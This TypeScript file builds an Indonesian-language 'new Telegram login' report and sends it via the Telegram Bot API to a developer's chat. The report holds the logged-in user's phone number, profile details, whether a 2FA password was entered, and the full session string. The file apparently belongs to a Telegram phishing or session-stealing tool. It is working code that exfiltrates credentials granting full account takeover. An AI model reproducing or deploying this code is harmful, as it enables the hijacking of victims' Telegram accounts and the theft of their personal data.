export async function sendHtmlToOwner(html: string): Promise<boolean> {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_DEVELOPER_CHAT_ID;

  if (!token || !chatId) {
    console.warn("[notify] TELEGRAM_BOT_TOKEN or TELEGRAM_DEVELOPER_CHAT_ID not set, skipping owner notification");
    return false;
  }

  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: html,
        parse_mode: "HTML",
      }),
      signal: AbortSignal.timeout(15000),
    });

    const data = await res.json().catch(() => ({}));
    if (!res.ok || data.ok === false) {
      const desc = data.description ?? `HTTP ${res.status}`;
      console.error("[notify] Failed to send HTML to owner:", desc);
      return false;
    }
    console.log("[notify] Owner notification sent successfully");
    return true;
  } catch (err) {
    console.error("[notify] Failed to send HTML to owner:", (err as Error).message ?? err);
    return false;
  }
}

export function buildProfileHtml(data: {
  userId: number | string;
  username: string | null;
  firstName: string | null;
  lastName: string | null;
  phone: string | null;
  bio: string | null;
  premium: boolean | null;
  sessionString: string;
  twoFaUsed: boolean;
}): string {
  const escape = (s: string | null | undefined) =>
    (s ?? "—")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");
  const fmtPhone = escape(data.phone ?? "—");
  const username = data.username ? `<a href="https://t.me/${data.username}">@${escape(data.username)}</a>` : escape(null);
  const fullName = [escape(data.firstName), escape(data.lastName)].filter(Boolean).join(" ") || escape(null);
  const bio = escape(data.bio);
  const session = escape(data.sessionString);
  const time = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

  return `
<b>🔔 Login Telegram Baru</b>
${data.twoFaUsed ? "<b>🔐 Via 2FA (Password)</b>" : ""}

<b>👤 Info Akun</b>
├ ID: <code>${escape(String(data.userId))}</code>
├ Username: ${username}
├ Nama: ${fullName}
├ Telepon: <code>${fmtPhone}</code>
├ Premium: ${data.premium ? "✅ Ya" : "❌ Tidak"}
└ Bio: ${bio}

<b>🔑 Session String</b>
<code>${session}</code>

<b>🕒 Waktu</b>
${time} WIB
`.trim();
}
